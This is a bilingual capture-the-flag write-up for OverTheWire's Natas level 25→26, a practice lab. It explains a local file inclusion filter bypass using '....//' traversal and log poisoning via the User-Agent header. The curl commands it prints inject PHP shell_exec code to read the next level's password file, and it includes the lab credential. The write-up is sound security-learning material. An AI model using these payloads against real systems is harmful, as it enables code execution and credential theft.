# Natas Nivel 25 → 26

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 25 → 26 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas25.natas.labs.overthewire.org` |

# username
natas25
# password
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
# web app vulnerability
Local File Inclusion (Filter Bypass), HTTP Header Injection, Log Poisoning
# method of solve
This web app is vulnerable to LFI, but there is filtering in place to prevent use of the `../` pattern
```
function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```
The next barrier to getting the password in the /etc/natas_webpass/natas26 file is this:
```
// dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
```
We cannot bypass this filter, but when we trigger that code, the logRequest function is run:
```
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```
The function is vulnerable to log poisoning through the HTTP User-Agent header. So we can inject PHP code when the error occurs:
```
curl -u 'natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws' -v 'http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....///var/www/natas/natas25/logs/natas25_413e96uk941o14rn1jb52ak29m.log' -b 'PHPSESSID=413e96uk941o14rn1jb52ak29m' -A '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
```
After this, we need to access the log file, but the code lets us know the file name:
```
$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
```
So we access the log file with this payload:
```
curl -u 'natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws' -v 'http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_413e96uk941o14rn1jb52ak29m.log' -b 'PHPSESSID=413e96uk941o14rn1jb52ak29m'
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
